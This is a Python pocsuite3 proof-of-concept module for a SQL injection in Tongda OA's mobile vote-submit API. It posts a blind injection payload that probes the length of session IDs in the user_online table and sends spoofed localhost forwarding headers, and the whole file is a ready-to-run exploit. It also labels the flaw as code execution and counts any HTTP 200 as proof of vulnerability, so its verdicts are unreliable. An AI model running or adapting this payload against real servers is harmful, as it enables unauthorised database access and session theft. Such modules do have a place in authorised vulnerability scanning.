from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import random,time,base64,re

class TestPOC(POCBase):
    vulID = '12341'  # ssvid
    version = '1.0'
    name = '通达OA sql注入漏洞'
    appName = '通达OA sql注入漏洞'
    appVersion = ''
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''sql注入'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):              #验证模式
        result = {}
        path = "/mobile/api/qyapp.vote.submit.php"
        vulurl = self.url+path
        data='submitData={"a":{"vote_type":"1","vote_id":"if(length((select SID from user_online limit 0,1))=26,1,2*1e308)","value":"1"}}'
        headers={"X-Forwarded-For": "127.0.0.1",
                 "X-Originating" : "127.0.0.1",
                 "X-Remote-IP": "127.0.0.1",
                 "X-Remote-Addr": "127.0.0.1",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
                 }
        try:
            resp = requests.post(url=vulurl,verify = False, allow_redirects = False, timeout=4,headers=headers,data=data)
            if resp.status_code==200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = path+"-----"+data
            return self.parse_output(result)
        except:
            pass
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
